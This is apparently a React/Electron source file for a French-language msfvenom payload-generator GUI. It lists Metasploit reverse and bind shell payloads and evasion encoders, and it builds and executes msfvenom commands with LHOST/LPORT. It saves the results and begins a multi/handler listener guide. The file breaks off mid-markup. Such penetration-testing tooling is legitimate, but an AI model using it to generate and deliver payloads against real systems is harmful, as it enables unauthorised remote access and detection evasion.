import React, { useState, useEffect } from 'react';
import { FiFolder, FiChevronRight, FiChevronDown, FiTerminal, FiInfo, FiCopy, FiDownload, FiSave, FiAlertCircle, FiHelpCircle } from 'react-icons/fi';

const Msfvenom = () => {
  // États pour gérer les données et l'interface utilisateur
  const [payloadTree, setPayloadTree] = useState({});
  const [encodersList, setEncodersList] = useState([]);
  const [formatsList, setFormatsList] = useState([]);
  const [platformsList, setPlatformsList] = useState([]);
  const [archsList, setArchsList] = useState([]);
  const [nopsList, setNopsList] = useState([]);
  const [expandedNodes, setExpandedNodes] = useState({});
  const [selectedCategory, setSelectedCategory] = useState('payloads');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  
  // État pour stocker le payload sélectionné actuellement
  const [selectedPayload, setSelectedPayload] = useState(null);
  
  // État pour la plateforme de l'utilisateur
  const [platform, setPlatform] = useState(null);
  
  // État pour l'adresse IP locale
  const [localIp, setLocalIp] = useState('');
  
  // État pour les options de configuration
  const [config, setConfig] = useState({
    lhost: '',
    lport: '4444',
    format: 'raw',
    encoder: '',
    platform: '',
    arch: '',
    nops: '',
    iterations: '1',
    badchars: '',
    outfile: ''
  });
  
  // État pour le résultat de la commande
  const [commandResult, setCommandResult] = useState(null);
  const [generatedCommand, setGeneratedCommand] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  
  // État pour les sections d'aide
  const [helpExpanded, setHelpExpanded] = useState(false);
  const [activeHelpSection, setActiveHelpSection] = useState('intro');

  // Fonction pour charger les données depuis la commande msfvenom
  const fetchMsfvenomData = async (category) => {
    setLoading(true);
    setError(null);
    
    try {
      if (!window.electronAPI || !window.electronAPI.executeCommand) {
        throw new Error("L'API Electron n'est pas disponible pour exécuter les commandes.");
      }

      // Commandes pour récupérer différentes catégories d'informations de msfvenom
      const commands = {
        payloads: 'msfvenom --list payloads',
        encoders: 'msfvenom --list encoders',
        formats: 'msfvenom --list formats',
        platforms: 'msfvenom --list platforms',
        archs: 'msfvenom --list archs',
        nops: 'msfvenom --list nops'
      };

      if (commands[category]) {
        try {
          // Essayer d'exécuter la vraie commande
          console.log(`Exécution de la commande: ${commands[category]}`);
          const result = await window.electronAPI.executeCommand(commands[category]);
          
          if (result.stderr && result.stderr.includes("command not found")) {
            throw new Error("msfvenom n'est pas installé ou n'est pas dans le PATH");
          }
          
          // Parser les résultats selon la catégorie
          if (category === 'payloads' && result.stdout) {
            const lines = result.stdout.split('\n');
            const payloads = {};
            
            // Parser la sortie et construire une structure hiérarchique
            for (const line of lines) {
              if (line.includes('    ')) {  // Les payloads ont généralement une indentation
                const parts = line.trim().split('  ');
                if (parts.length >= 1) {
                  const payloadPath = parts[0].trim();
                  const description = parts.slice(1).join(' ').trim();
                  
                  // Diviser le chemin en segments
                  const segments = payloadPath.split('/');
                  
                  // Construction récursive de l'arborescence
                  let current = payloads;
                  for (let i = 0; i < segments.length - 1; i++) {
                    if (!current[segments[i]]) {
                      current[segments[i]] = {};
                    }
                    current = current[segments[i]];
                  }
                  
                  // Ajouter la description au nœud final
                  current[segments[segments.length - 1]] = description || "Pas de description disponible";
                }
              }
            }
            
            if (Object.keys(payloads).length > 0) {
              setPayloadTree(payloads);
              return;
            }
          } else if (category === 'encoders' && result.stdout) {
            const lines = result.stdout.split('\n');
            const encoders = [];
            
            for (const line of lines) {
              if (line.includes('    ')) {
                const parts = line.trim().split('  ');
                if (parts.length >= 1) {
                  encoders.push(parts[0].trim());
                }
              }
            }
            
            if (encoders.length > 0) {
              setEncodersList(encoders);
              return;
            }
          } else if (category === 'formats' && result.stdout) {
            const lines = result.stdout.split('\n');
            const formats = [];
            
            for (const line of lines) {
              if (line.trim() && !line.includes('Name') && !line.includes('----')) {
                const format = line.trim().split(' ')[0];
                if (format) formats.push(format);
              }
            }
            
            if (formats.length > 0) {
              setFormatsList(formats);
              return;
            }
          } else if (category === 'platforms' && result.stdout) {
            const lines = result.stdout.split('\n');
            const platforms = [];
            
            for (const line of lines) {
              if (line.trim() && !line.includes('Name') && !line.includes('----')) {
                const platform = line.trim().split(' ')[0];
                if (platform) platforms.push(platform);
              }
            }
            
            if (platforms.length > 0) {
              setPlatformsList(platforms);
              return;
            }
          } else if (category === 'archs' && result.stdout) {
            const lines = result.stdout.split('\n');
            const archs = [];
            
            for (const line of lines) {
              if (line.trim() && !line.includes('Name') && !line.includes('----')) {
                const arch = line.trim().split(' ')[0];
                if (arch) archs.push(arch);
              }
            }
            
            if (archs.length > 0) {
              setArchsList(archs);
              return;
            }
          } else if (category === 'nops' && result.stdout) {
            const lines = result.stdout.split('\n');
            const nops = [];
            
            for (const line of lines) {
              if (line.includes('    ')) {
                const parts = line.trim().split('  ');
                if (parts.length >= 1) {
                  nops.push(parts[0].trim());
                }
              }
            }
            
            if (nops.length > 0) {
              setNopsList(nops);
              return;
            }
          }
        } catch (error) {
          console.error(`Erreur lors de l'exécution de la commande msfvenom: ${error.message}`);
          // Continuez avec les données mockées (fallback)
        }
      }

      // Si la commande a échoué ou ne correspond à aucune catégorie, utilisez des données mockées
      if (category === 'payloads') {
        // Données mockées pour les payloads
        const mockData = {
          cmd: {
            windows: {
              tftp: {
                x64: {
                  meterpreter: {
                    bind_tcp_uuid: "Fetch and execute an x64 payload from a TFTP server. Listen for a connection with UUID Support (Windows x64)",
                    reverse_http: "Fetch and execute an x64 payload from a TFTP server. Tunnel communication over HTTP (Windows x64 wininet)",
                    reverse_https: "Fetch and execute an x64 payload from a TFTP server. Tunnel communication over HTTP (Windows x64 wininet)",
                    reverse_named_pipe: "Fetch and execute an x64 payload from a TFTP server. Connect back to the attacker via a named pipe pivot",
                    reverse_tcp: "Fetch and execute an x64 payload from a TFTP server. Connect back to the attacker (Windows x64)"
                  }
                }
              }
            }
          },
          generic: {
            custom: "Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.",
            debug_trap: "Generate a debug trap in the target process",
            shell_bind_tcp: "Listen for a connection and spawn a command shell",
            shell_reverse_tcp: "Connect back to attacker and spawn a command shell",
            tight_loop: "Generate a tight loop in the target process"
          }
        };
        
        setPayloadTree(mockData);
      } else if (category === 'encoders') {
        // Données mockées pour les encoders
        setEncodersList(['x86/shikata_ga_nai', 'x64/xor', 'cmd/powershell_base64']);
      } else if (category === 'formats') {
        // Données mockées pour les formats
        setFormatsList(['raw', 'exe', 'dll', 'elf', 'js_pe', 'powershell', 'python']);
      } else if (category === 'platforms') {
        // Données mockées pour les plateformes
        setPlatformsList(['windows', 'linux', 'osx', 'android']);
      } else if (category === 'archs') {
        // Données mockées pour les architectures
        setArchsList(['x86', 'x64', 'armle', 'mipsle']);
      } else if (category === 'nops') {
        // Données mockées pour les nops
        setNopsList(['x86/single_byte', 'x64/simple']);
      }
    } catch (err) {
      setError("Erreur lors du chargement des données msfvenom: " + err.message);
    } finally {
      setLoading(false);
    }
  };

  // Charger les données au montage du composant
  useEffect(() => {
    fetchMsfvenomData(selectedCategory);
    
    // Détecter la plateforme de l'utilisateur
    if (window.electronAPI && window.electronAPI.getPlatform) {
      window.electronAPI.getPlatform().then(plat => {
        setPlatform(plat);
      }).catch(err => {
        console.error("Erreur lors de la détection de la plateforme:", err);
      });
    }
    
    // Détecter l'adresse IP locale
    detectLocalIp();
  }, [selectedCategory]);

  // Fonction pour détecter l'adresse IP locale
  const detectLocalIp = async () => {
    try {
      if (!window.electronAPI || !window.electronAPI.executeCommand) {
        console.error("L'API Electron n'est pas disponible pour exécuter les commandes");
        return;
      }
      
      // Exécuter une commande différente selon la plateforme
      let command;
      if (platform === 'win32') {
        command = 'powershell -Command "Get-NetIPAddress | Where-Object { $_.AddressFamily -eq \'IPv4\' -and !$_.IPAddress.StartsWith(\'127.\') -and !$_.IPAddress.StartsWith(\'169.\') } | Select-Object -ExpandProperty IPAddress"';
      } else {
        // Pour Linux et macOS
        command = 'ip -4 addr show | grep -oP \'(?<=inet\\s)\\d+(\\.\\d+){3}\' | grep -v 127.0.0.1 | head -n 1';
      }
      
      const result = await window.electronAPI.executeCommand(command);
      
      if (result && result.stdout) {
        // Nettoyer la sortie pour obtenir l'adresse IP
        const ip = result.stdout.trim().split('\n')[0];
        if (ip && /^\d+(\.\d+){3}$/.test(ip)) {
          setLocalIp(ip);
        }
      }
    } catch (err) {
      console.error('Erreur lors de la détection de l\'adresse IP locale:', err);
    }
  };

  // Fonction pour basculer l'état d'expansion d'un nœud
  const toggleNode = (path) => {
    setExpandedNodes(prev => ({
      ...prev,
      [path]: !prev[path]
    }));
  };

  // Fonction pour sélectionner un payload
  const handleSelectPayload = (path, description) => {
    setSelectedPayload({
      path,
      description
    });
  };

  // Fonction récursive pour rendre l'arborescence des payloads
  const renderTree = (node, path = '') => {
    if (typeof node === 'string') {
      // C'est une feuille (payload final)
      return (
        <div 
          key={path}
          className="pl-6 py-1 hover:bg-gray-100 cursor-pointer flex items-center"
          onClick={() => handleSelectPayload(path, node)}
        >
          <FiTerminal className="mr-2 text-gray-600" />
          <span className={`${selectedPayload && selectedPayload.path === path ? 'text-indigo-600 font-semibold' : ''}`}>
            {path.split('/').pop()}
          </span>
        </div>
      );
    }

    // C'est un nœud interne (dossier)
    const currentPath = path ? path : '';
    const isExpanded = expandedNodes[currentPath] || false;
    
    return (
      <div key={currentPath} className={`${currentPath ? 'pl-6' : ''}`}>
        <div 
          className="py-1 hover:bg-gray-100 cursor-pointer flex items-center"
          onClick={() => toggleNode(currentPath)}
        >
          {isExpanded ? <FiChevronDown className="mr-1" /> : <FiChevronRight className="mr-1" />}
          <FiFolder className="mr-2 text-yellow-500" />
          <span className="font-medium">{currentPath ? currentPath.split('/').pop() : 'Racine'}</span>
        </div>
        
        {isExpanded && (
          <div>
            {Object.entries(node).map(([key, value]) => {
              const newPath = currentPath ? `${currentPath}/${key}` : key;
              return renderTree(value, newPath);
            })}
          </div>
        )}
      </div>
    );
  };

  // Fonction pour gérer les changements dans le formulaire de configuration
  const handleConfigChange = (e) => {
    const { name, value } = e.target;
    setConfig(prev => ({
      ...prev,
      [name]: value
    }));
  };
  
  // Génération de la commande msfvenom
  const generateCommand = () => {
    if (!selectedPayload) return;
    
    let cmd = `msfvenom -p ${selectedPayload.path}`;
    
    // Ajouter les options nécessaires
    if (config.lhost) cmd += ` LHOST=${config.lhost}`;
    if (config.lport) cmd += ` LPORT=${config.lport}`;
    if (config.format) cmd += ` -f ${config.format}`;
    if (config.encoder) cmd += ` -e ${config.encoder}`;
    if (config.platform) cmd += ` --platform ${config.platform}`;
    if (config.arch) cmd += ` --arch ${config.arch}`;
    if (config.iterations && config.iterations !== '1') cmd += ` -i ${config.iterations}`;
    if (config.badchars) cmd += ` -b '${config.badchars}'`;
    if (config.outfile) cmd += ` -o ${config.outfile}`;
    
    setGeneratedCommand(cmd);
  };
  
  // Mettre à jour la commande lorsque la configuration change
  useEffect(() => {
    if (selectedPayload) {
      generateCommand();
    }
  }, [selectedPayload, config]);
  
  // Fonction pour exécuter la commande
  const executeCommand = async () => {
    if (!generatedCommand) return;
    
    setIsGenerating(true);
    setCommandResult(null);
    
    try {
      // Vérifier si l'API Electron est disponible
      if (!window.electronAPI || !window.electronAPI.executeCommand) {
        throw new Error("L'API Electron n'est pas disponible pour exécuter les commandes.");
      }
      
      console.log('Exécution de la commande:', generatedCommand);
      
      // Exécuter la commande via l'API Electron
      const result = await window.electronAPI.executeCommand(generatedCommand);
      
      if (result.stderr && result.stderr.trim() !== '') {
        // Si la sortie stderr contient des erreurs mais que le code de sortie est 0,
        // cela peut simplement être des avertissements
        if (result.error) {
          throw new Error(result.stderr || "Erreur lors de l'exécution de la commande");
        }
      }
      
      // Analyser la sortie
      let output = result.stdout || "Commande exécutée sans sortie";
      let data = null;
      
      // Si un fichier de sortie a été spécifié, indiquer où le trouver
      if (config.outfile) {
        output += `\nPayload écrit dans le fichier: ${config.outfile}`;
      } else {
        // Si pas de fichier de sortie, la sortie contient directement le payload
        // On pourrait extraire les données binaires pour les afficher de manière formatée
        data = output;
      }
      
      setCommandResult({
        success: true,
        output: output,
        data: data
      });
    } catch (err) {
      setCommandResult({
        success: false,
        error: err.message || "Une erreur s'est produite lors de la génération du payload"
      });
    } finally {
      setIsGenerating(false);
    }
  };
  
  // Fonction pour copier la commande dans le presse-papiers
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      alert("Copié dans le presse-papiers!");
    }).catch(err => {
      console.error('Erreur lors de la copie :', err);
    });
  };

  // Fonction pour sauvegarder le résultat dans un fichier
  const savePayloadToFile = async () => {
    if (!commandResult || !commandResult.success || !commandResult.data) {
      alert("Aucun payload à sauvegarder");
      return;
    }
    
    try {
      if (!window.electronAPI || !window.electronAPI.showSaveFileDialog || !window.electronAPI.writeFile) {
        throw new Error("L'API Electron n'est pas disponible pour sauvegarder des fichiers");
      }
      
      const options = {
        title: 'Enregistrer le payload',
        defaultPath: 'payload.bin',
        filters: [
          { name: 'Fichiers binaires', extensions: ['bin'] },
          { name: 'Tous les fichiers', extensions: ['*'] }
        ]
      };
      
      const filePath = await window.electronAPI.showSaveFileDialog(options);
      
      if (!filePath) {
        // L'utilisateur a annulé
        return;
      }
      
      // Écrire les données dans le fichier
      await window.electronAPI.writeFile(filePath, commandResult.data);
      
      alert(`Payload enregistré avec succès dans ${filePath}`);
    } catch (err) {
      alert(`Erreur lors de l'enregistrement du payload: ${err.message}`);
      console.error('Erreur lors de l\'enregistrement:', err);
    }
  };
  
  // Fonction pour sauvegarder la commande dans un script
  const saveCommandToScript = async () => {
    if (!generatedCommand) {
      alert("Aucune commande à sauvegarder");
      return;
    }
    
    try {
      if (!window.electronAPI || !window.electronAPI.showSaveFileDialog || !window.electronAPI.writeFile) {
        throw new Error("L'API Electron n'est pas disponible pour sauvegarder des fichiers");
      }
      
      // Déterminer l'extension selon la plateforme
      const isWindows = platform === 'win32';
      const extension = isWindows ? 'bat' : 'sh';
      const scriptHeader = isWindows ? '@echo off\n' : '#!/bin/bash\n';
      
      const options = {
        title: 'Enregistrer le script',
        defaultPath: `generate_payload.${extension}`,
        filters: [
          { name: isWindows ? 'Batch scripts' : 'Shell scripts', extensions: [extension] },
          { name: 'Tous les fichiers', extensions: ['*'] }
        ]
      };
      
      const filePath = await window.electronAPI.showSaveFileDialog(options);
      
      if (!filePath) {
        // L'utilisateur a annulé
        return;
      }
      
      // Créer le contenu du script
      const scriptContent = `${scriptHeader}echo Génération du payload avec msfvenom...\n${generatedCommand}\necho Terminé.`;
      
      // Écrire le script dans le fichier
      await window.electronAPI.writeFile(filePath, scriptContent);
      
      alert(`Script de commande enregistré avec succès dans ${filePath}`);
    } catch (err) {
      alert(`Erreur lors de l'enregistrement du script: ${err.message}`);
      console.error('Erreur lors de l\'enregistrement:', err);
    }
  };

  // Fonction pour sélectionner un élément dans les listes
  const handleSelectEncoder = (encoder) => {
    setConfig(prev => ({ ...prev, encoder }));
  };

  const handleSelectFormat = (format) => {
    setConfig(prev => ({ ...prev, format }));
  };

  const handleSelectPlatform = (platform) => {
    setConfig(prev => ({ ...prev, platform }));
  };

  const handleSelectArch = (arch) => {
    setConfig(prev => ({ ...prev, arch }));
  };

  const handleSelectNop = (nop) => {
    setConfig(prev => ({ ...prev, nops: nop }));
  };

  // Fonction pour afficher les listes simples (encoders, formats, etc.)
  const renderSimpleList = (items, itemType, onSelect, selectedValue) => {
    if (!items || items.length === 0) {
      return <div className="text-gray-500 dark:text-gray-400">Aucun {itemType} disponible</div>;
    }

    return (
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
        {items.map((item, index) => (
          <button
            key={index}
            onClick={() => onSelect(item)}
            className={`p-2 rounded-md text-left text-sm ${
              selectedValue === item 
                ? 'bg-indigo-50 dark:bg-indigo-900/30 border border-indigo-300 dark:border-indigo-700 text-indigo-700 dark:text-indigo-300'
                : 'hover:bg-gray-50 dark:hover:bg-gray-700/50 text-gray-700 dark:text-gray-300'
            }`}
          >
            <div className="flex items-center justify-between">
              <span className="font-mono">{item}</span>
              {selectedValue === item && (
                <span className="text-xs bg-indigo-100 dark:bg-indigo-800 text-indigo-700 dark:text-indigo-300 px-1 rounded">
                  Sélectionné
                </span>
              )}
            </div>
          </button>
        ))}
      </div>
    );
  };

  // Rendu du composant
  return (
    <div className="container mx-auto p-4 text-gray-800 dark:text-gray-200">
      <h1 className="text-2xl font-bold mb-4">MSFvenom Payload Generator</h1>
      
      {/* Tabs for different categories */}
      <div className="flex mb-4 border-b dark:border-gray-700">
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'payloads' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('payloads')}
        >
          Payloads
          {selectedPayload && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'encoders' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('encoders')}
        >
          Encoders
          {config.encoder && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'formats' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('formats')}
        >
          Formats
          {config.format && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'platforms' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('platforms')}
        >
          Platforms
          {config.platform && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'archs' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('archs')}
        >
          Architectures
          {config.arch && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
        <button 
          className={`py-2 px-4 flex items-center ${selectedCategory === 'nops' ? 'border-b-2 border-indigo-500 text-indigo-600' : 'text-gray-600'}`}
          onClick={() => setSelectedCategory('nops')}
        >
          NOPs
          {config.nops && <span className="ml-2 text-xs bg-indigo-100 text-indigo-800 px-2 py-0.5 rounded-full">Sélectionné</span>}
        </button>
      </div>
      
      {/* Main content area with loading and error states */}
      <div className="flex flex-col md:flex-row gap-4">
        {/* Tree view panel */}
        <div className="md:w-1/2 border rounded-lg p-4 h-96 overflow-auto">
          {loading && <p className="text-gray-600">Chargement des données...</p>}
          {error && <p className="text-red-500">{error}</p>}
          
          {selectedCategory === 'payloads' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez un payload</h2>
              <div className="mt-2">
                {renderTree(payloadTree)}
              </div>
            </div>
          )}
          
          {selectedCategory === 'encoders' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez un encoder</h2>
              <p className="text-sm text-gray-600 mb-3">Les encoders permettent de modifier le format binaire du payload pour éviter les détections.</p>
              <div className="mt-2">
                {renderSimpleList(encodersList, 'encoder', handleSelectEncoder, config.encoder)}
              </div>
            </div>
          )}
          
          {selectedCategory === 'formats' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez un format</h2>
              <p className="text-sm text-gray-600 mb-3">Le format détermine la manière dont le payload sera généré.</p>
              <div className="mt-2">
                {renderSimpleList(formatsList, 'format', handleSelectFormat, config.format)}
              </div>
            </div>
          )}
          
          {selectedCategory === 'platforms' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez une plateforme</h2>
              <p className="text-sm text-gray-600 mb-3">La plateforme cible sur laquelle le payload sera exécuté.</p>
              <div className="mt-2">
                {renderSimpleList(platformsList, 'platform', handleSelectPlatform, config.platform)}
              </div>
            </div>
          )}
          
          {selectedCategory === 'archs' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez une architecture</h2>
              <p className="text-sm text-gray-600 mb-3">L'architecture du processeur cible.</p>
              <div className="mt-2">
                {renderSimpleList(archsList, 'arch', handleSelectArch, config.arch)}
              </div>
            </div>
          )}
          
          {selectedCategory === 'nops' && !loading && !error && (
            <div>
              <h2 className="text-lg font-semibold mb-2">Sélectionnez un NOP generator</h2>
              <p className="text-sm text-gray-600 mb-3">Les générateurs NOP créent des instructions sans opération pour les "NOP sleds".</p>
              <div className="mt-2">
                {renderSimpleList(nopsList, 'nop', handleSelectNop, config.nops)}
              </div>
            </div>
          )}
        </div>
        
        {/* Configuration panel */}
        <div className="md:w-1/2 border rounded-lg p-4 overflow-auto dark:border-gray-700">
          <h2 className="text-lg font-semibold mb-4">Configuration</h2>
          
          {selectedPayload ? (
            <div>
              <p className="mb-2"><span className="font-semibold">Payload sélectionné:</span> {selectedPayload.path}</p>
              <p className="mb-4"><span className="font-semibold">Description:</span> {selectedPayload.description}</p>
              
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* LHOST */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      LHOST (Adresse IP)
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        name="lhost"
                        value={config.lhost}
                        onChange={handleConfigChange}
                        placeholder="ex: 192.168.1.10"
                        className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                      />
                      {localIp && (
                        <button
                          type="button"
                          onClick={() => setConfig(prev => ({ ...prev, lhost: localIp }))}
                          className="absolute right-2 top-2 text-xs bg-indigo-100 dark:bg-indigo-900 text-indigo-800 dark:text-indigo-300 px-2 py-1 rounded"
                        >
                          Utiliser {localIp}
                        </button>
                      )}
                    </div>
                  </div>
                  
                  {/* LPORT */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      LPORT (Port)
                    </label>
                    <input
                      type="text"
                      name="lport"
                      value={config.lport}
                      onChange={handleConfigChange}
                      placeholder="ex: 4444"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Format */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Format
                    </label>
                    <select
                      name="format"
                      value={config.format}
                      onChange={handleConfigChange}
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    >
                      <option value="raw">raw</option>
                      <option value="exe">exe</option>
                      <option value="dll">dll</option>
                      <option value="elf">elf</option>
                      <option value="vba">vba</option>
                      <option value="js_pe">js_pe</option>
                      <option value="powershell">powershell</option>
                      <option value="python">python</option>
                    </select>
                  </div>
                  
                  {/* Encoder */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Encoder (optionnel)
                    </label>
                    <input
                      type="text"
                      name="encoder"
                      value={config.encoder}
                      onChange={handleConfigChange}
                      placeholder="ex: x86/shikata_ga_nai"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Platform */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Plateforme (optionnel)
                    </label>
                    <input
                      type="text"
                      name="platform"
                      value={config.platform}
                      onChange={handleConfigChange}
                      placeholder="ex: windows"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Architecture */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Architecture (optionnel)
                    </label>
                    <input
                      type="text"
                      name="arch"
                      value={config.arch}
                      onChange={handleConfigChange}
                      placeholder="ex: x64"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Iterations */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Iterations d'encodage
                    </label>
                    <input
                      type="number"
                      name="iterations"
                      value={config.iterations}
                      onChange={handleConfigChange}
                      min="1"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Bad Characters */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Bad Characters (optionnel)
                    </label>
                    <input
                      type="text"
                      name="badchars"
                      value={config.badchars}
                      onChange={handleConfigChange}
                      placeholder="ex: \x00\x0a\x0d"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                  
                  {/* Output File */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Fichier de sortie (optionnel)
                    </label>
                    <input
                      type="text"
                      name="outfile"
                      value={config.outfile}
                      onChange={handleConfigChange}
                      placeholder="ex: /tmp/payload.exe"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 dark:bg-gray-700 dark:text-gray-100"
                    />
                  </div>
                </div>
                
                {/* Generated Command */}
                <div className="mt-4">
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Commande générée
                  </label>
                  <div className="relative">
                    <div className="w-full px-3 py-2 bg-gray-100 dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm font-mono text-sm overflow-x-auto text-gray-800 dark:text-gray-200">
                      {generatedCommand}
                    </div>
                    <div className="absolute right-2 top-2 flex space-x-2">
                      <button 
                        onClick={() => copyToClipboard(generatedCommand)}
                        className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300"
                        title="Copier la commande"
                      >
                        <FiCopy />
                      </button>
                      <button 
                        onClick={saveCommandToScript}
                        className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300"
                        title="Sauvegarder comme script"
                      >
                        <FiSave />
                      </button>
                    </div>
                  </div>
                </div>
                
                {/* Execute Button */}
                <div className="mt-4 flex justify-center">
                  <button
                    onClick={executeCommand}
                    disabled={isGenerating}
                    className={`px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 ${isGenerating ? 'opacity-50 cursor-not-allowed' : ''}`}
                  >
                    {isGenerating ? 'Génération en cours...' : 'Générer le Payload'}
                  </button>
                </div>
                
                {/* Command Result */}
                {commandResult && (
                  <div className={`mt-4 p-3 rounded-md ${commandResult.success ? 'bg-green-50 border border-green-200' : 'bg-red-50 border border-red-200'}`}>
                    <div className="flex justify-between items-start">
                      <h3 className={`text-sm font-medium ${commandResult.success ? 'text-green-800' : 'text-red-800'}`}>
                        {commandResult.success ? 'Payload généré avec succès' : 'Erreur'}
                      </h3>
                      {commandResult.success && commandResult.data && (
                        <div className="flex space-x-2">
                          <button
                            onClick={() => copyToClipboard(commandResult.data)}
                            className="text-sm text-indigo-600 hover:text-indigo-800 flex items-center"
                            title="Copier les données"
                          >
                            <FiCopy className="mr-1" />
                          </button>
                          <button
                            onClick={savePayloadToFile}
                            className="text-sm text-indigo-600 hover:text-indigo-800 flex items-center"
                            title="Enregistrer le payload"
                          >
                            <FiDownload className="mr-1" />
                          </button>
                        </div>
                      )}
                    </div>
                    <pre className="mt-2 text-sm overflow-x-auto max-h-60">
                      {commandResult.success ? commandResult.output : commandResult.error}
                    </pre>
                    {commandResult.success && !config.outfile && (
                      <div className="mt-2 flex items-center text-amber-600">
                        <FiAlertCircle className="mr-2" />
                        <span className="text-sm">
                          Aucun fichier de sortie n'a été spécifié. Vous pouvez enregistrer le payload en utilisant l'icône de téléchargement ci-dessus.
                        </span>
                      </div>
                    )}
                    
                    {/* Guide Metasploit pour les payloads reverse */}
                    {commandResult.success && selectedPayload && selectedPayload.path.includes('reverse') && config.lhost && config.lport && (
                      <div className="mt-4 bg-indigo-50 p-3 rounded-md border border-indigo-200">
                        <h4 className="text-sm font-medium text-indigo-800 mb-2">
                          <FiInfo className="inline mr-1" /> Comment utiliser ce payload avec Metasploit
                        </h4>
                        <div className="text-sm">
                          <p className="mb-2">Pour intercepter les connexions de ce payload, exécutez les commandes suivantes dans Metasploit:</p>
                          <div className="bg-gray-800 text-gray-100 p-2 rounded font-mono text-xs overflow-x-auto">
                            $ msfconsole<br />
                            msf6 &gt; use multi/handler<br />
                            msf6 exploit(multi/handler) &gt; set PAYLOAD {selectedPayload.path}<br />
